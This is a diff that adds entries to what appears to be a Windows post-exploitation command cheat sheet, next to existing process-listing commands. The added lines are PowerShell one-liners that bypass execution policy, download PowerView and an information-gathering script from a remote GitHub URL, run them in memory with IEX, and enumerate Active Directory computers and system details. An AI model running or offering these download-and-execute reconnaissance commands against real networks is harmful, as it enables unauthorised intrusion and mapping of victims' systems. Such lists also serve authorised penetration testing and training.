@@ -141,4 +141,8 @@ Get a process list
 - powershell.exe -command Get-Process
 - wmic process get caption,executablepath,commandline /format:csv
 
+Get list of all computers in AD
+- powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1');Get-NetComputers
 
+Collection of information by systems, registries and  other info
+- powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/Information.ps1');Get-Information
